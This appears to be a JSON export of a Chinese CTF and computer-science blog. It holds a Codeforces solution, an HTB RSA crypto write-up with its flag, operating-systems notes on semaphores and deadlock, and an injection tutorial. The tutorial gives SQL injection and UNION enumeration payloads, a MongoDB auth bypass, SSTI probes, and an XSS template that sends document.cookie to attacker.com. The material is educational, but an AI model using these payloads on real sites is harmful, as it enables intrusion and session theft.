$\\sum^n_{i=0}b_i \\leq \\sum^n_{i=0}a_i$，因为二进制展开永远是唯一的，不难得到 $\\forall i : a_i = b_i$。 所以我们这道题需要做的就是计算 $\\sum^n_{i=0}a_i$，也就是说只需要数 $x$ 的二进制表达里一共有多少个1。 代码C++1234567891011#include &lt;iostream&gt;#include &lt;bitset&gt;using namespace std;int main() &#123; int x; cin &gt;&gt; x; cout &lt;&lt; __builtin_popcount(x) &lt;&lt; endl; // __builtin_popcount(x) 会返回整数 x 的二进制中 1 的个数。 return 0;&#125; 也可以原始一点： 12345678910111213141516#include &lt;iostream&gt;using namespace std;int main() &#123; int x; cin &gt;&gt; x; int count = 0; while (x &gt; 0) &#123; if (x % 2 == 1) &#123; count++; &#125; x /= 2; &#125; cout &lt;&lt; count &lt;&lt; endl; return 0;&#125;","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"1000","slug":"1000","permalink":"https://archer-baiyi.github.io/tags/1000/"},{"name":"binary","slug":"binary","permalink":"https://archer-baiyi.github.io/tags/binary/"}]},{"title":"HTB-RSAisEasy-Writeup","slug":"CTF/Crypto/HTB-RSAisEasy-Writeup","date":"2025-04-07T20:51:41.000Z","updated":"2025-04-07T21:26:21.507Z","comments":true,"path":"2025/04/07/CTF/Crypto/HTB-RSAisEasy-Writeup/","permalink":"https://archer-baiyi.github.io/2025/04/07/CTF/Crypto/HTB-RSAisEasy-Writeup/","excerpt":"","text":"题目 附件： 123456789101112131415161718192021222324#!/usr/bin/env python3from Crypto.Util.number import bytes_to_long, getPrimefrom secrets import flag1, flag2from os import urandomflag1 = bytes_to_long(flag1)flag2 = bytes_to_long(flag2)p, q, z = [getPrime(512) for i in range(3)]e = 0x10001n1 = p * qn2 = q * zc1 = pow(flag1, e, n1)c2 = pow(flag2, e, n2)E = bytes_to_long(urandom(69))print(f&#x27;n1: &#123;n1&#125;&#x27;)print(f&#x27;c1: &#123;c1&#125;&#x27;)print(f&#x27;c2: &#123;c2&#125;&#x27;)print(f&#x27;(n1 * E) + n2: &#123;n1 * E + n2&#125;&#x27;) output.txt： 12345n1: 101302608234750530215072272904674037076286246679691423280860345380727387460347553585319149306846617895151397345134725469568034944362725840889803514170441153452816738520513986621545456486260186057658467757935510362350710672577390455772286945685838373154626020209228183673388592030449624410459900543470481715269c1: 92506893588979548794790672542461288412902813248116064711808481112865246689691740816363092933206841082369015763989265012104504500670878633324061404374817814507356553697459987468562146726510492528932139036063681327547916073034377647100888763559498314765496171327071015998871821569774481702484239056959316014064c2: 46096854429474193473315622000700040188659289972305530955007054362815555622172000229584906225161285873027049199121215251038480738839915061587734141659589689176363962259066462128434796823277974789556411556028716349578708536050061871052948425521408788256153194537438422533790942307426802114531079426322801866673(n1 * E) + n2: 601613204734044874510382122719388369424704454445440856955212747733856646787417730534645761871794607755794569926160226856377491672497901427125762773794612714954548970049734347216746397532291215057264241745928752782099454036635249993278807842576939476615587990343335792606509594080976599605315657632227121700808996847129758656266941422227113386647519604149159248887809688029519252391934671647670787874483702292498358573950359909165677642135389614863992438265717898239252246163 分析我们首先将已知条件列出来： \\begin{align} n1 = p\\cdot q\\\\ n2 = q \\cdot z \\end{align}并且我们有 $n1$ 以及 $n1 \\cdot E + n2$ 的值。我们需要通过这些信息计算出 $p,q,z$ 的值。（因为给的 $n1 \\cdot E + n2$ 不是 $n1$ 的倍数，所以gcd$(p,z)= 1$） 注意到： n1 \\cdot E + n2 = q(p \\cdot E + z)以及 \\text{gcd}(n1, n1 \\cdot E + n2) = \\text{gcd}(p\\cdot q, p \\cdot q \\cdot E + q \\cdot z) = q \\cdot \\text{gcd}(p, p \\cdot E + z) \\overset{\\text{gcd}(p,z)=1}{=} q因为 $p,q,z$ 均为512位的质数，所以它们的取值范围是： 2^{511} \\leq p,q,z \\leq 2^{512}所以z除以q一定是小于等于2的，这意味着： z \\in \\{(z \\text{ mod } p), p + (z \\text{ mod } p)\\}由此，解密的流程为： 先通过计算 $n1$ 和 $n1 \\cdot E + n2$ 的最大公因数得到 $q$ 根据 $n1,q$ 的值得到 $p$ 根据 $n1 \\cdot E + n2, p, q$ 计算 $z$ （通过尝试可以得知z &lt; p，所以 $z = (p \\cdot E + z \\text{ mod } p$ ） 计算d1, d2然后RSA解密。 代码123456789101112131415161718192021222324252627282930from math import gcdfrom Crypto.Util.number import long_to_bytesn1 = 101302608234750530215072272904674037076286246679691423280860345380727387460347553585319149306846617895151397345134725469568034944362725840889803514170441153452816738520513986621545456486260186057658467757935510362350710672577390455772286945685838373154626020209228183673388592030449624410459900543470481715269# (n1 * E) + n2 = q(p*E + z):n12 = 601613204734044874510382122719388369424704454445440856955212747733856646787417730534645761871794607755794569926160226856377491672497901427125762773794612714954548970049734347216746397532291215057264241745928752782099454036635249993278807842576939476615587990343335792606509594080976599605315657632227121700808996847129758656266941422227113386647519604149159248887809688029519252391934671647670787874483702292498358573950359909165677642135389614863992438265717898239252246163c1= 92506893588979548794790672542461288412902813248116064711808481112865246689691740816363092933206841082369015763989265012104504500670878633324061404374817814507356553697459987468562146726510492528932139036063681327547916073034377647100888763559498314765496171327071015998871821569774481702484239056959316014064c2= 46096854429474193473315622000700040188659289972305530955007054362815555622172000229584906225161285873027049199121215251038480738839915061587734141659589689176363962259066462128434796823277974789556411556028716349578708536050061871052948425521408788256153194537438422533790942307426802114531079426322801866673e = 0x10001q = gcd(n1,n12 %n1)p = n1//qz = (n12//q) % pn2 = q*zd1 = pow(e,-1,(p-1)*(q-1))m1 = pow(c1,d1,n1)flag = long_to_bytes(m1)d2 = pow(e,-1,(z-1)*(q-1))m2 = pow(c2,d2,n2)flag+=long_to_bytes(m2)print(flag)# b&#x27;HTB&#123;1_m1ght_h4v3_m3ss3d_uP_jU$t_4_l1ttle_b1t?&#125;&#x27; 运行得到flag：HTB{1_m1ght_h4v3_m3ss3d_uP_jU$t_4_l1ttle_b1t?}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://archer-baiyi.github.io/tags/Crypto/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"RSA","slug":"RSA","permalink":"https://archer-baiyi.github.io/tags/RSA/"}]},{"title":"代码注入 Injection","slug":"CTF/Web/注入-Injection","date":"2025-04-03T21:24:51.000Z","updated":"2025-05-31T09:07:39.444Z","comments":true,"path":"2025/04/03/CTF/Web/注入-Injection/","permalink":"https://archer-baiyi.github.io/2025/04/03/CTF/Web/%E6%B3%A8%E5%85%A5-Injection/","excerpt":"各种注入漏洞及方法","text":"代码注入代码注入攻击（Code Injection）是指攻击者通过将恶意代码注入到目标系统中执行的行为。这些恶意代码可以用于修改、破坏或窃取系统数据，甚至完全控制目标系统。代码注入攻击（Code Injection）利用了系统在处理输入数据时的弱点，经过精心设计的恶意代码会被误以为是合法的指令而被系统执行，从而导致安全漏洞。 以下是常见的注入类型： 注入类型 注入目标 SQL 注入 数据库查询语句 命令注入 操作系统命令 脚本注入 / XSS 网页脚本（JS） 模板注入（SSTI） 服务器模板语法 LDAP 注入 LDAP 查询语句 XML 注入（XXE） XML 实体/结构 基本上所有的代码注入的漏洞都是由于没有对用户的输入进行足够细致的过滤。 SQL Injection漏洞123456db = sqlite3.connect(&quot;:memory:&quot;, isolation_level=None)load_internet(db)cur = db.cursor()cur.execute(&quot;SELECT * FROM internet_index WHERE title LIKE &#x27;%&#123;&#125;%&#x27;&quot;.format(q)) #将未过滤的输入直接拼接进SQL查询语句 注入常用的测试漏洞的Payload： 1234567891011&#x27; OR 1=1 --&#x27; OR 1=1 -- -&#x27; OR 1=1 #&#x27; OR &#x27;1&#x27;=&#x27;1 --&#x27; OR 1=1; #&#x27; OR username=&#x27;admin&#x27; -- （在 MariaDB / MySQL 中，# 是单行注释符，而不是--。） 确认漏洞确实存在并且确定了具体注入格式了之后便可以开始后续的步骤。 而读取其他表格前我们需要先确定当前表格的字段数（一共有多少列），可以通过Union来尝试： 12345&#x27; UNION SELECT 1 -- &#x27; UNION SELECT 1,2 -- &#x27; UNION SELECT 1,2,3 -- &#x27; UNION SELECT 1,2,3,4 -- ... 失败的情况一般会返回类似于 Error: The used SELECT statements have a different number of columns 的报错。（或者就干脆什么都不显示，抑或是提示失败。）这个方法同时可以确定当前正常情况的返回结果为当前表格的哪个字段。 确定字段数（表格的列数）了之后便可以： 1. 确认所有表格名称： 1&#x27; UNION SELECT null, table_name, null, null FROM information_schema.tables WHERE table_schema=database() -- null的数量以及table_name的位置取决于当前表格的字段数（一共有多少列）以及返回结果具体为哪个字段（列）。 假设当前表格叫做为logins。 2. 确认某个表格的所有列名（字段名）： 123&#x27; UNION SELECT 1, GROUP_CONCAT(column_name SEPARATOR &#x27;, &#x27;), null, null FROM information_schema.columns WHERE table_name=&#x27;logins&#x27; -- &#x27; UNION SELECT 1, column_name, null, null FROM information_schema.columns WHERE table_name=&#x27;logins&#x27; -- 如果不成功则可以一列一列确定： 123456789&#x27; UNION SELECT 1, column_name, null, null FROM information_schema.columns WHERE table_name=&#x27;logins&#x27; LIMIT 0,1 -- &#x27; UNION SELECT 1, column_name, null, null FROM information_schema.columns WHERE table_name=&#x27;logins&#x27; LIMIT 1,1 -- &#x27; UNION SELECT 1, column_name, null, null FROM information_schema.columns WHERE table_name=&#x27;logins&#x27; LIMIT 2,1 -- &#x27; UNION SELECT 1, column_name, null, null FROM information_schema.columns WHERE table_name=&#x27;logins&#x27; LIMIT 3,1 -- ... 3. 确认某个表格所有列的内容： 假设现在有4列内容，为a,b,c,d，则直接用Union即可： 1&#x27; UNION a, b, c, d FROM logins -- 如果失败则也可以一项一项确定某一列的内容： 123456&#x27; UNION SELECT null, username, null, null FROM logins LIMIT 0,1 -- &#x27; UNION SELECT null, username, null, null FROM logins LIMIT 1,1 -- &#x27; UNION SELECT null, username, null, null FROM logins LIMIT 2,1 -- &#x27; UNION SELECT null, username, null, null FROM logins LIMIT 3,1 -- ... MangoDB： 1234&#123; &quot;email&quot;: &#123;&quot;$ne&quot;: None&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: None&#125;&#125; 模板注入 Server-Side Template Injection（SSTI）服务器端模板注入（Server-side Template Injection，简称SSTI）是指攻击者能够利用模板引擎的原生语法，将恶意代码注入到模板中，而该模板随后会在服务器端被执行。 模板引擎的作用是通过将固定的模板与动态数据结合，来生成网页。当用户输入被直接拼接到模板中（而不是作为数据安全地传入）时，就可能发生服务器端模板注入攻击。这样一来，攻击者可以注入任意的模板指令，从而操控模板引擎，往往最终能完全控制服务器。 Jinja2漏洞： 1&lt;p class=&quot;nes-text is-primary warrior-name&quot;&gt;&#123;warrior_name&#125;&lt;/p&gt; （大括号里的内容为未过滤的输入） 注入： 1&#123;&#123; 7*7 &#125;&#125; Mako漏洞： 12345678from mako.template import Templatedef generate_render(converted_fonts): result = &#x27;&#x27;&#x27; &lt;tr&gt;&lt;td&gt;&#123;3&#125;&lt;/td&gt;&lt;/tr&gt; &#x27;&#x27;&#x27;.format(*converted_fonts) return Template(result).render() （大括号里的内容为未过滤的输入） 注入： 1$&#123;7*7&#125; PugXSS漏洞1&lt;p&gt;You requested help in the &#123;&#123;ln|safe&#125;&#125; language!&lt;/p&gt; |safe 会直接放行我们的任意输入。 注入测试Payload： 123456789&lt;script&gt;alert(1)&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt; &lt;svg onload=alert(1)&gt; &lt;video&gt;&lt;source onerror=alert(1)&gt;&lt;/video&gt;&lt;iframe onload=alert(1)&gt; 普通的xss攻击模板： 1&lt;script&gt;fetch(&quot;http://attacker.com?cookie=&quot; + document.cookie); &lt;/script&gt; 可以在 https://requestbin.kanbanbox.com/ 创建一个临时的RequestBin。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"}]},{"title":"GBS 2 Prozess- und Prozessorverwaltung 进程与处理器管理","slug":"TUM info 笔记/GBS/GBS-2-Prozess-und-Prozessorverwaltung-进程与处理器管理","date":"2025-04-03T21:21:10.000Z","updated":"2025-04-26T18:30:46.287Z","comments":true,"path":"2025/04/03/TUM info 笔记/GBS/GBS-2-Prozess-und-Prozessorverwaltung-进程与处理器管理/","permalink":"https://archer-baiyi.github.io/2025/04/03/TUM%20info%20%E7%AC%94%E8%AE%B0/GBS/GBS-2-Prozess-und-Prozessorverwaltung-%E8%BF%9B%E7%A8%8B%E4%B8%8E%E5%A4%84%E7%90%86%E5%99%A8%E7%AE%A1%E7%90%86/","excerpt":"操作系统基础相关笔记","text":"进程（Prozess）进程管理（Prozessverwaltung）Dispathcer调度（Scheduling）调度策略（Scheduling-Strategien）First-Come-First-Served (FCFS) Shorttest Job First (SJF) Shortest Remaining Time Next (SRTN) Round-Robing Scheduling (RR) Proority Scheduling Earliest Deadline First (EDF) 线程（Threads）","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM-info-课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"进程","slug":"进程","permalink":"https://archer-baiyi.github.io/tags/%E8%BF%9B%E7%A8%8B/"},{"name":"线程","slug":"线程","permalink":"https://archer-baiyi.github.io/tags/%E7%BA%BF%E7%A8%8B/"}]},{"title":"GBS 3 Parallele Systeme und Synchronisation 并行系统与同步","slug":"TUM info 笔记/GBS/GBS-3-Parallele-Systeme-und-Synchronisation-并行系统与同步","date":"2025-04-03T21:20:44.000Z","updated":"2025-04-26T18:30:50.840Z","comments":true,"path":"2025/04/03/TUM info 笔记/GBS/GBS-3-Parallele-Systeme-und-Synchronisation-并行系统与同步/","permalink":"https://archer-baiyi.github.io/2025/04/03/TUM%20info%20%E7%AC%94%E8%AE%B0/GBS/GBS-3-Parallele-Systeme-und-Synchronisation-%E5%B9%B6%E8%A1%8C%E7%B3%BB%E7%BB%9F%E4%B8%8E%E5%90%8C%E6%AD%A5/","excerpt":"操作系统基础相关笔记","text":"Einführung因为（单核）系统无法做到真正的并行进程，所以所谓的parallel的活动会导致不确定性（Nichtdeterminismus），即系统在相同的初始条件和相同的输入下表现出不同的行为。 例子： 假设现在我们有一个变量 $x = 2$，以及2个进程： 进程1：$x = x + 5$ 进程2：$x = x \\cdot 2$ 那么如果先运行进程1再运行2就会得到 $x = 14$，先运行进程2再运行1就会得到 $x = 9$ 。 介绍几个概念： 竞态条件（Race Condition）：至少两个进程在读取或写入共享资源。这个时候最终结果会依赖于进程执行的顺序。 临界区（Kritischer Abschnitt，critical section/region）：进程会在临界区中访问共享资源，而对于只能被独占使用的资源，访问将被顺序化/串行化（sequentialisiert）。 所有跟共享资源相关的操作都会在临界区里执行。 互斥（Wechselseitiger Ausschluss，Mutual Exclusion）：确保同一时间只有一个进程/线程能访问临界资源（critical section）。 互斥的实现一共需要注意以下几点： 临界区必须是互斥访问的（wechselseitig ausgeschlossen），即同一时间只有一个进程可以进入临界区（kritischer Abschnitt） 互斥的实现不得依赖于进程执行临界区的顺序假设。 互斥的实现不得依赖于进程执行时间的假设。 不能让某个进程无限期地阻止另一个进程进入临界区，即避免Starvation。 图解： 在以下几个层面都有对应的办法来实现互斥/同步： 硬件层面 通过禁止中断（Interrupts sperren）实现互斥（如中断屏蔽） 使用原子机器指令（如 TSL、cmpxchg）保障操作不可分割（atomic） 简单的系统层面 主动等待（如：Spin-Lock，busy waiting） 被动等待（如：sleep/wakeup，节省 CPU） 更高级的操作系统层面 信号量（Semaphore）：支持主动或被动等待 互斥锁（Mutex） 编程语言层面 监视器（Monitor）概念：语言层级的同步抽象 硬件层面中断屏蔽（Unterbrechnungssperre）中断（Interrupt, Unterbrechung ）是通过专用的中断线路发出的信号，例如： I/O 设备发出信号表示任务已完成 定时器发出信号表示时间片已用尽 而中断会打断当前的活动进程，将其转为就绪/等待状态（rechenwillig/wartend），然后Interrupt Handler会来处理这个中断。 所以我们可以通过屏蔽中断来实现互斥访问：让 CPU 暂时禁止处理中断（temporarily prevent the CPU from responding to interrupts），防止当前进程在执行期间被强制让出 CPU，这样一来进程就可以不被打扰地完成其临界区操作。 只不过这个方法（中断屏蔽）只适用于单处理器系统来实现临界区，因为在多处理器系统中，即使一个 CPU 禁用了中断，其他 CPU 仍然可以访问共享资源。 并且实施时需要注意几点： 确保由中断屏蔽保护的临界区必须很短。 因为所有中断都是有意义的，随便屏蔽的话系统容易出问题。 该机制最多只应在操作系统内核中使用。 为了安全性考虑。 原子性机器指令（Atomare Maschinenbefehle）大多数计算机架构都具备专门用于原子操作的机器指令，我们这里以其中的 TSL（Test-and-Set Lock）为例子。 具体实现的话需要先定义2个函数：enter_crit_region和leave_crit_region 。（见下方代码） 具体流程： 通过共享变量 lock 对内存访问进行同步 在进入临界区之前，进程 P 会调用 enter_crit_region 如果 lock == 0，则进程 P 可以执行其临界区代码 否则，进程必须主动等待（忙等，busy waiting），直到 lock 被重置为 0 临界区结束后，进程 P 必须重置共享变量 lock，调用 leave_crit_region enter_crit_region： 12345enter_crit_region: tsl rax, [lock] ; 将 lock 的值读入 rax，并将 lock 设置为 1（原子操作） cmp rax, $0 ; 判断原值是否为 0（锁是否空闲） jne enter_crit_region ; Busy Waiting（一直等） ret ; 如果是 0，表示可以进入临界区 leave_crit_region： 123leave_crit_region: mov [lock], $0 ; 将 lock 重置为 0，释放锁 ret 简单的系统层面主动等待（Aktives Warten）刚才提到的同步概念被叫做自旋锁（Spin-Lock）：进程会在一个循环中不断检查资源是否仍然被占用，也就是所谓的主动等待（Aktives Warten）。 但是一直在这里等的话效率非常低下。 示例： 123456/* busy waiting emulation */int main () &#123; while (shouldWait) &#123; // 什么都不做，只是一直干等 &#125;&#125; Passives Warten（被动等待）相比之下 Passives Warten（被动等待） 就要高效很多：会使用系统服务（比如说 sleep）让进程进入等待状态（wartend），或者使用系统服务（比如说 wakeup ）让进程进入可运行状态（echenbereit）。 比如说2个进程传输数据，A传给B。A传的时候让B进入等待状态，等A传完了再把B叫起来让它处理数据。 例子：生产者消费者问题（Erzeuger-Verbraucher-Problem）在这个例子中我们会有2个并行的进程：一个生产者（Erzeuger，producer）和一个消费者（Verbraucher，consumer）。两者共用一个缓存区（Puffer，Buffer）。对缓冲区的访问必须实现互斥。 先给一个反例，后续会慢慢看到如何正确解决这个问题： 123456789101112void producer(void) &#123; int item = 0; while (true) &#123; item = produce_item(); if (count == N) sleep(); insert_item(item); count = count + 1; // 注意这里 if (count == 1) wakeup(consumer); &#125;&#125; 123456789101112void consumer(void) &#123; int item = 0; while (true) &#123; if (count == 0) sleep(); item = remove_item(); count = count - 1; // 注意这里 if (count == N - 1) wakeup(producer); consume_item(item); &#125;&#125; 可以看到这里希望通过 count 来实现互斥，但问题是 count 本身就是一个共享变量。 更高级的操作系统层面信号量（Semaphore）定义： 信号量（Semaphore）是一个整数控制变量 s 在这个变量上定义了三种操作： 初始化（Initialisierung） P（down、wait） V（up、signal） 控制变量的值表示：允许多少个进程同时进入临界区 （P和V代表的是Proberen 和 Verhogen，是荷兰语，因为提出信号量这个概念的是Dijkstra，他是荷兰人。） 那么这两个操作具体是怎么定义的呢： down 操作（P）： 控制变量 s 会被减一 如果 s &lt; 0，当前进程 必须等待 而在使用被动等待的实现中： 进程会被转为“等待状态”，并被加入等待队列（Wait-Queue）中管理 up 操作（V ）： 控制变量 s 会被加一 如果使用的是被动等待： 如果等待队列不为空，则唤醒其中一个进程（变为就绪状态，rechenbereit ） 代码示例： 1234567void down(semaphore *wa) &#123; int* s = &amp;wa-&gt;s; // 访问wa这个结构体中s的值，简单来讲就是访问当前s的值。 *s -= 1; if (*s &lt; 0) &#123; thread_yield(wa-&gt;wait_queue); // 把当前线程挂起，放入等待队列 &#125;&#125; 1234567void up(semaphore *wa) &#123; int* s = &amp;wa-&gt;s; // 访问wa这个结构体中s的值，简单来讲就是访问当前s的值。 *s += 1; if (*s &lt;= 0) &#123; thread_wakeup(wa-&gt;wait_queue); // 从等待队列中唤醒一个线程 &#125;&#125; 那么我们该怎么使用这个信号量呢？ 首先定义一个信号量对象 wa 将控制变量 s 初始化为 1（或更大的 n） 取决于我们希望有多少个进程同时进入临界区 用 P/V 操作包裹临界区代码： 123down(&amp;wa); // P操作：尝试进入execute_crit_region(); // 临界区操作up(&amp;wa); // V操作：释放信号量 ok，我们现在拥有更高级的工具了，再回来看一下刚才没有完全解决的生产者-消费者-问题。 还是先看一个反例： 只使用一个信号量 wa 来控制对缓冲区的访问，初始化为1。 1234567/* Producer */while (true) &#123; element = produce(); // 生产一个元素 down(&amp;wa); // 请求进入临界区 write_to_buf(W, element); // 写入缓冲区 up(&amp;wa); // 释放临界区&#125; 1234567/* Consumer */while (true) &#123; down(&amp;wa); // 请求进入临界区 element = read_from_buf(W); // 从缓冲区读取元素 up(&amp;wa); // 释放临界区 consume(element); // 消费数据&#125; 问题出在没有能够反应当前缓冲区是否满或者是空的状态。 假如Producer进入了满的缓冲区，那么它无法进行写入操作，也就无法进行后续的 up(&amp;wa) 。它会卡在这里，并且Consumer也无法进来读取数据。 那么该如何正确地解决这个问题呢： 我们需要在此基础上添加2个信号量： 一个用于表示当前的缓冲区已满：voll，初始化为0 一个用于表示当前的缓冲区剩余的位置：leer，初始化为n，n 是缓冲区大小。 123456789/* Producer */while (true) &#123; element = produce(); // 生产数据 down(&amp;leer); // 等待有空位 down(&amp;wa); // 请求进入缓冲区（互斥） write_to_buf(W, element); // 写入缓冲区 up(&amp;wa); // 释放互斥锁 up(&amp;voll); // 增加“已满”计数&#125; 123456789/* Consumer */while (true) &#123; down(&amp;voll); // 等待有数据可读 down(&amp;wa); // 请求进入缓冲区（互斥） element = read_from_buf(W); // 读取数据 up(&amp;wa); // 释放互斥锁 up(&amp;leer); // 增加“空位”计数 consume(element); // 消费数据&#125; 互斥锁（Mutex）Mutex类似于二进制信号量（binary semaphore），只有2个状态：unlocked 和 locked。 注意：可以将Mutex当成2元信号量来理解，但是要清楚他们严格来讲并不一样。最大的区别便是拥有权： 互斥锁（Mutex）只能由获取锁的实体（Entity）进行解锁（也就是说，它有一个Owner）。 信号量（Semaphore）没有 Owner 的概念。 编程语言层面监视器（Monitore）属于比信号量（Semaphore）更高级的抽象层级。 监视器将数据和对数据的访问操作封装在一起，实现自动同步，编译器则负责生成底层的信号量及其使用代码。 简单来讲就是监视器（Monitore）会把互斥访问这一部分封装成一个黑盒（Black Box），使用时只需调用接口，不需要关心底层是怎么加锁、解锁的。这样一来也更不容易出错。 一般使用定义好的操作 Produce 和 Consume 来调用监视器（Monitore）。 例子：Speisende Philosophen（Dining Philosophers）死锁（Deadlock）死锁（Deadlock）描述的是一组进程里每个进程都在等待一个事件发生，但这个事件只能由其他等待中的进程触发。 比如说A和B去图书馆借书，A已经借了x，B已经借了y。但现在A想借y，B想借x。只不过双方都希望借到新书了之后再把手上现有的这本还回去。这样就会陷入僵局，也就是死锁。 例子： 1234567void process_A(void) &#123; down(&amp;sema_resource_1); // 请求资源 R1 down(&amp;sema_resource_2); // 请求资源 R2 use_both_resources(); // 使用两个资源 up(&amp;sema_resource_2); // 释放 R2 up(&amp;sema_resource_1); // 释放 R1&#125; 1234567void process_B(void) &#123; down(&amp;sema_resource_2); // 请求资源 R2 down(&amp;sema_resource_1); // 请求资源 R1 use_both_resources(); // 使用两个资源 up(&amp;sema_resource_1); // 释放 R1 up(&amp;sema_resource_2); // 释放 R2&#125; 出现死锁（Deadlock）的充要条件（Notwendige und hinreichende Bedingungen）： 互斥使用资源（Exklusiv nutzbare Ressource，Mutual Exclusion） 共享资源不可同时被多个进程访问。 占有且等待（Belegen und Anfordern，Hold and Wait） 进程已经持有资源，还要继续请求其他资源。 不可抢占（Nicht Entziehbar，No Preemption） 资源不能被强行拿走（被系统抢回），只能自己释放。 循环等待（Zyklische Wartebedingung，Circular Wait） 至少两个或更多进程形成一个循环，每个进程都在等待另一个进程所持有的资源。 （死锁是等价于这4个条件同时满足的。） 建模有向图 Belegungsanforderungsgraphen： 点 圆圈表示进程， 方形表示资源 边 进程A占用（belegt）资源R：R到A的边 进程A想要（fordert）资源R：A到R的边 例子： Deadlocks的应对策略主要有4种策略： 忽视（Ignorieren） 检测（Deadlock-Detection ，Erkennung） 分配资源后检测/模拟是否会产生死锁，如果会的话就回档。 避免（Deadlock-Avoidance，Vermeidung） 分配资源前模拟是否会产生死锁 使用 Bankier-Algorithmus 预防（Deadlock-Prevention，Verhinderung） 设计的时候就避免死锁出现，确保上面的4个条件至少有一条不会出现。 对比： 策略类型 方法 优点 缺点 识别（Erkennung） 周期性检测（Periodischer Aufruf） 可交互式响应（Interaktive Reaktion） 可能通过中止造成损失（Verlust durch Abbruch） 避免（Vermeidung） 银行家算法（Bankiers-Algorithmus） 无需资源抢占（Kein Ressourcenzug） 需要提前知道未来资源需求（Zukünftiger Bedarf muss bekannt sein） 预防（Verhinderung） 资源分配采用固定顺序（Feste Reihenfolge bei Zuteilung） 无需运行时检查（Keine Laufzeitprüfungen） 静态、不灵活（Statisch, inflexibel） 一次性分配所有资源（Alle Ressourcen auf einmal zuteilen） 不需要资源抢占（Kein Ressourcenzug notwendig） 效率低（Ineffizient） 例题例题1假设现在有2个线程并行运行，并且共享内存（Shared Memory）中的x和y被初始化为0： 1234// Thread 1if (y &gt;= 0)&#123; x = x+1; //atomic&#125; 1234// Thread 2while (x &lt;= 0 &amp;&amp; y &gt; -3)&#123; y = y-1; //atomic&#125; 问题1：给出所以可能的结果组合。（Was sind alle möglichen Kombinationen der Werte für x und y nach der nicht-deterministsichen Ausführung der obenstehenden Threadds?） 首先假设一开始先只运行Thread 2，等结束了之后在运行Thread 1，这时 $y=-3$，已经不满足Thread 1里的 if 条件了，所以结果为 $(x,y)=(0,-3)$ 。 假设先只运行Thread 1，等完全结束了之后再运行Thread 2，这时 $x=1$ ，已经不满足Thread 2里的 while 条件了，所以结果为 $(x,y)=(1,0)$ 。 假设Thread 1，2先读取了 $x,y=0$ ，然后各自运行了一次，这时 $(x,y)=(1,-1)$ ，都不满足判断条件了，所以2个都结束，结果为 $(x,y)=(1,-1)$。 假设Thread 1，2先读取了 $x,y=0$ ，然后 Thread 2 先运行了2次 （这时 $y=-2$），然后 Thread 1 运行了1次，那么结果为 $(x,y)=(1,-2)$ 。 假设Thread 1，2先读取了 $x,y=0$ ，然后 Thread 2 先运行了3次 （这时 $y=-3$），然后 Thread 1 运行了1次，那么结果为 $(x,y)=(1,-3)$ 。 所以答案为： x y 0 -3 1 0 1 -1 1 -2 1 -3 问题2：现在该怎么利用Semaphoren和Mutex（限量3个及以内）使得最终结果为 $x=1, y=-1$？ 回顾一下上面的逻辑，想要得到这个结果需要让 Thread 1，2先读取 $x,y=0$ ，然后各自运行一次。 我们这里需要利用Mutex设置2道坎： 在做 if 或者 while 判断前设置一道 在 Thread 2 的while循环内的结尾设置一个 这样一来可以确保双方都先读取 $x,y=0$ ，然后运行一次 Thread 2之后运行 Thread 1。最终得到 $x=1, y=-1$ 。 答案： Innitialisierungsblock 12block_t1(0)block_t2(0) Codeblock 12345678910// Thread 1if (y &gt;= 0)&#123; up(block_t2); // 先等Thread 1 通过的if的判断再放行 Thread 2 down(block_t1); x = x + 1; up(block_t2);&#125; 123456789// Thread 2down(block_t2;)while (x &lt;= 0 &amp;&amp; y &gt; -3)&#123; y = y-1; up(block_t1); down(block_t2); // 先等 Thread 2 运行了一次之后再运行 Thread 1&#125; 先让t1通过if判断，然后blockieren。这时t2通过wihle判断并进行一轮操作，接着再进行t1的操作。t1操作完再通知t2可以进行后续操作（即进行第二次的while的判断）。","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 